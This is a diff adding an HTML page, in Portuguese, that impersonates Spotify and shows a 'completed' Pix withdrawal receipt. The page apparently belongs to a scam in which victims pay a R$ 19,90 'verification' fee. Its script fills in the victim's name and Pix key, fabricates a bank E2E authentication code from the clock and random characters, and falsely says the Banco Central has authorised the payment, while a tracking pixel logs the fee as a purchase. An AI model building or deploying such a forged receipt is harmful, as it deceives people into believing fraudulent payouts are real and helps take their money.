@@ -1,0 +1,524 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Saque Concluído | Comprovante Oficial Spotify</title>
+
+    <!-- MICROSOFT CLARITY -->
+    <script type="text/javascript">
+        (function(c,l,a,r,i,t,y){
+            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+        })(window, document, "clarity", "script", "vf9o4hng1f");
+    </script>
+
+    <!-- Facebook Pixel -->
+    <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '1949165059042573');
+    fbq('track', 'PageView');
+    fbq('track', 'Purchase', {value: 19.90, currency: 'BRL'});
+    </script>
+    <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1949165059042573&ev=PageView&noscript=1"/></noscript>
+
+    <!-- FONT GOOGLE POPPINS -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+
+        body {
+            background-color: #0b0b0b;
+            color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding-bottom: 40px;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* TOPO FIXO */
+        #topoFixo {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 60px;
+            background-color: #000000;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 20px;
+            z-index: 100;
+        }
+
+        .brand-logo {
+            height: 28px;
+            width: auto;
+            max-width: 120px;
+            object-fit: contain;
+            display: block;
+        }
+
+        .badge-status-topo {
+            background: rgba(30, 215, 96, 0.15);
+            border: 1px solid rgba(30, 215, 96, 0.4);
+            color: #1ed760;
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .badge-status-topo::before {
+            content: '';
+            width: 8px;
+            height: 8px;
+            background-color: #1ed760;
+            border-radius: 50%;
+            box-shadow: 0 0 8px #1ed760;
+        }
+
+        /* CONTAINER */
+        .container {
+            margin-top: 80px;
+            width: 100%;
+            max-width: 440px;
+            padding: 16px;
+        }
+
+        /* SUCESSO HEADER */
+        .sucesso-header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .check-animado {
+            width: 72px;
+            height: 72px;
+            background: linear-gradient(135deg, rgba(30, 215, 96, 0.2), rgba(30, 215, 96, 0.05));
+            border: 2px solid #1ed760;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+            box-shadow: 0 0 24px rgba(30, 215, 96, 0.35);
+            animation: pulseGlow 2s infinite;
+        }
+
+        @keyframes pulseGlow {
+            0% { box-shadow: 0 0 15px rgba(30, 215, 96, 0.25); transform: scale(1); }
+            50% { box-shadow: 0 0 30px rgba(30, 215, 96, 0.5); transform: scale(1.03); }
+            100% { box-shadow: 0 0 15px rgba(30, 215, 96, 0.25); transform: scale(1); }
+        }
+
+        .check-animado svg {
+            width: 38px;
+            height: 38px;
+            stroke: #1ed760;
+            stroke-width: 3;
+            fill: none;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+        }
+
+        .sucesso-header h1 {
+            font-size: 22px;
+            font-weight: 700;
+            color: #ffffff;
+            margin-bottom: 6px;
+        }
+
+        .sucesso-header p {
+            font-size: 13px;
+            color: #a0a0a0;
+            line-height: 1.5;
+        }
+
+        /* COMPROVANTE CARD */
+        .comprovante-card {
+            background: #121212;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 18px;
+            overflow: hidden;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.6);
+            margin-bottom: 20px;
+        }
+
+        .comprovante-top {
+            background: linear-gradient(180deg, #181818, #141414);
+            padding: 20px;
+            text-align: center;
+            border-bottom: 1px dashed rgba(255, 255, 255, 0.15);
+            position: relative;
+        }
+
+        .comprovante-tag {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 11px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            color: #1ed760;
+            background: rgba(30, 215, 96, 0.1);
+            padding: 4px 10px;
+            border-radius: 6px;
+            margin-bottom: 10px;
+        }
+
+        .comprovante-valor-label {
+            font-size: 12px;
+            color: #888;
+            margin-bottom: 4px;
+        }
+
+        .comprovante-valor {
+            font-size: 34px;
+            font-weight: 800;
+            color: #1ed760;
+            letter-spacing: -0.5px;
+        }
+
+        .comprovante-taxa-aviso {
+            font-size: 11px;
+            color: #88ffd1;
+            margin-top: 6px;
+            display: inline-block;
+        }
+
+        .comprovante-body {
+            padding: 20px;
+        }
+
+        .comprovante-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            padding: 10px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            font-size: 13px;
+        }
+
+        .comprovante-item:last-child {
+            border-bottom: none;
+        }
+
+        .item-label {
+            color: #888;
+            flex-shrink: 0;
+            margin-right: 12px;
+        }
+
+        .item-value {
+            color: #ffffff;
+            font-weight: 600;
+            text-align: right;
+            word-break: break-all;
+        }
+
+        .item-value.destaque {
+            color: #1ed760;
+        }
+
+        .badge-liquidado {
+            background: #1ed760;
+            color: #000;
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-size: 11px;
+            font-weight: 700;
+            display: inline-block;
+        }
+
+        .autenticacao-box {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 10px;
+            padding: 12px;
+            margin-top: 14px;
+            font-size: 11px;
+            color: #777;
+            text-align: center;
+        }
+
+        .autenticacao-hash {
+            font-family: 'Courier New', Courier, monospace;
+            color: #aaa;
+            margin-top: 4px;
+            font-size: 10px;
+            word-break: break-all;
+        }
+
+        /* AVISO DE COMPENSAÇÃO */
+        .aviso-card {
+            background: linear-gradient(135deg, rgba(30, 215, 96, 0.12), rgba(30, 215, 96, 0.03));
+            border: 1px solid rgba(30, 215, 96, 0.3);
+            border-radius: 14px;
+            padding: 14px 16px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+        }
+
+        .aviso-icon {
+            font-size: 20px;
+            line-height: 1;
+        }
+
+        .aviso-texto h3 {
+            font-size: 13px;
+            font-weight: 700;
+            color: #1ed760;
+            margin-bottom: 2px;
+        }
+
+        .aviso-texto p {
+            font-size: 12px;
+            color: #ccc;
+            line-height: 1.4;
+        }
+
+        /* BOTÕES */
+        .btn-salvar {
+            width: 100%;
+            background: #1ed760;
+            color: #000000;
+            border: none;
+            border-radius: 50px;
+            padding: 16px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            box-shadow: 0 4px 15px rgba(30, 215, 96, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 12px;
+        }
+
+        .btn-salvar:hover {
+            background: #25f26e;
+            transform: scale(1.02);
+        }
+
+        .btn-voltar {
+            width: 100%;
+            background: transparent;
+            color: #888;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 50px;
+            padding: 12px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            text-align: center;
+            text-decoration: none;
+            display: block;
+        }
+
+        .btn-voltar:hover {
+            color: #fff;
+            border-color: rgba(255, 255, 255, 0.3);
+        }
+
+        /* PRINT STYLES */
+        @media print {
+            body { background: #fff; color: #000; }
+            #topoFixo, .btn-salvar, .btn-voltar, .aviso-card { display: none !important; }
+            .container { margin-top: 0; padding: 0; max-width: 100%; }
+            .comprovante-card { border: 1px solid #ccc; box-shadow: none; background: #fff; }
+            .comprovante-top { background: #f5f5f5; border-bottom: 1px dashed #999; }
+            .comprovante-valor, .item-value.destaque { color: #0b8043 !important; }
+            .item-value { color: #000 !important; }
+            .item-label { color: #555 !important; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- TOPO FIXO -->
+    <header id="topoFixo">
+        <img src="/checkout/images/logo.png" class="brand-logo" alt="Spotify">
+        <div class="badge-status-topo">
+            Transferência Concluída
+        </div>
+    </header>
+
+    <main class="container">
+
+        <!-- CABEÇALHO SUCESSO -->
+        <div class="sucesso-header">
+            <div class="check-animado">
+                <svg viewBox="0 0 24 24">
+                    <path d="M5 13l4 4L19 7"/>
+                </svg>
+            </div>
+            <h1>Saque Realizado com Sucesso!</h1>
+            <p>Seu saldo foi liberado com prioridade máxima e transferido para a chave Pix informada.</p>
+        </div>
+
+        <!-- COMPROVANTE OFICIAL -->
+        <section class="comprovante-card" id="comprovante">
+            <div class="comprovante-top">
+                <div class="comprovante-tag">
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="#1ed760"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+                    Comprovante Oficial de Transferência Pix
+                </div>
+                <div class="comprovante-valor-label">Valor total creditado</div>
+                <div class="comprovante-valor" id="valorTotalTransferido">R$ 402,66</div>
+                <div class="comprovante-taxa-aviso">✓ Saldo acumulado (R$ 382,76) + Estorno da verificação (R$ 19,90)</div>
+            </div>
+
+            <div class="comprovante-body">
+                <div class="comprovante-item">
+                    <span class="item-label">Status da Transação:</span>
+                    <span class="item-value"><span class="badge-liquidado">TRANSFERIDO ✓</span></span>
+                </div>
+                <div class="comprovante-item">
+                    <span class="item-label">Favorecido:</span>
+                    <span class="item-value" id="nomeFavorecido">Carregando...</span>
+                </div>
+                <div class="comprovante-item">
+                    <span class="item-label">Chave Pix Destino:</span>
+                    <span class="item-value destaque" id="chavePixDestino">Carregando...</span>
+                </div>
+                <div class="comprovante-item">
+                    <span class="item-label">Tipo de Chave:</span>
+                    <span class="item-value" id="tipoChavePix">Chave Vinculada</span>
+                </div>
+                <div class="comprovante-item">
+                    <span class="item-label">Instituição Pagadora:</span>
+                    <span class="item-value">Spotify Brasil / SpeedPag S.A.</span>
+                </div>
+                <div class="comprovante-item">
+                    <span class="item-label">Data e Hora:</span>
+                    <span class="item-value" id="dataHora">--/--/---- às --:--:--</span>
+                </div>
+                <div class="comprovante-item">
+                    <span class="item-label">Canal de Envio:</span>
+                    <span class="item-value">SPI (Sistema de Pagamentos Instantâneos - Bacen)</span>
+                </div>
+
+                <div class="autenticacao-box">
+                    <span>Autenticação Bancária (ID E2E):</span>
+                    <div class="autenticacao-hash" id="codigoAutenticacao">E00416968202609081830a7b9c2d1e0f4</div>
+                </div>
+            </div>
+        </section>
+
+        <!-- AVISO DE COMPENSAÇÃO -->
+        <div class="aviso-card">
+            <div class="aviso-icon">⚡</div>
+            <div class="aviso-texto">
+                <h3>Crédito em Conta Instantâneo</h3>
+                <p>A ordem de pagamento foi autorizada pelo Banco Central. O valor já está sendo refletido no aplicativo do seu banco em até <strong>5 minutos</strong>.</p>
+            </div>
+        </div>
+
+        <!-- BOTÕES -->
+        <button class="btn-salvar" onclick="salvarComprovante()">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+            Salvar Comprovante
+        </button>
+        <a href="/inicio/" class="btn-voltar">Voltar para o Início</a>
+
+    </main>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const params = new URLSearchParams(window.location.search);
+
+            // 1. Nome do Favorecido
+            const nome = params.get('nome') || 
+                         localStorage.getItem('usuario_nome') || 
+                         localStorage.getItem('pix_nome') || 
+                         localStorage.getItem('usuario_nome_input') || 
+                         'Lucas Gaona';
+            document.getElementById('nomeFavorecido').textContent = nome;
+
+            // 2. Chave Pix
+            let chave = params.get('pix') || 
+                        localStorage.getItem('pix_chave') || 
+                        localStorage.getItem('pix_key') || 
+                        params.get('telefone') || 
+                        '•••••••3188';
+            document.getElementById('chavePixDestino').textContent = chave;
+
+            // 3. Detectar Tipo de Chave Pix
+            const chaveLimpa = chave.replace(/\D/g, '');
+            let tipo = 'Chave Cadastrada';
+            if (chave.includes('@')) {
+                tipo = 'E-mail';
+            } else if (chaveLimpa.length === 11) {
+                tipo = 'CPF / Telefone';
+            } else if (chaveLimpa.length === 14) {
+                tipo = 'CNPJ';
+            } else if (chave.length > 25) {
+                tipo = 'Chave Aleatória (EVP)';
+            }
+            document.getElementById('tipoChavePix').textContent = tipo;
+
+            // 4. Data e Hora Atuais
+            const agora = new Date();
+            const dia = String(agora.getDate()).padStart(2, '0');
+            const mes = String(agora.getMonth() + 1).padStart(2, '0');
+            const ano = agora.getFullYear();
+            const horas = String(agora.getHours()).padStart(2, '0');
+            const minutos = String(agora.getMinutes()).padStart(2, '0');
+            const segundos = String(agora.getSeconds()).padStart(2, '0');
+            document.getElementById('dataHora').textContent = `${dia}/${mes}/${ano} às ${horas}:${minutos}:${segundos}`;
+
+            // 5. Autenticação Bancária E2E
+            const txId = params.get('transacao_id') || params.get('id') || localStorage.getItem('pix_txid_up1') || localStorage.getItem('pix_txid') || '';
+            const randomHex = Math.random().toString(36).substring(2, 12) + Math.random().toString(36).substring(2, 8);
+            const e2e = `E00416968${ano}${mes}${dia}${horas}${minutos}${txId ? txId.substring(0, 6) : randomHex}`;
+            document.getElementById('codigoAutenticacao').textContent = e2e.toUpperCase();
+
+            // 6. Limpar estados de transação para evitar loops futuros
+            localStorage.removeItem('transacao_atual');
+            localStorage.removeItem('pix_txid');
+            localStorage.removeItem('pix_code');
+        });
+
+        function salvarComprovante() {
+            window.print();
+        }
+    </script>
+
+    <!-- UTMIFY -->
+    <script
+        src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+        data-utmify-prevent-xcod-sck
+        data-utmify-prevent-subids
+        async
+        defer>
+    </script>
+</body>
+</html>
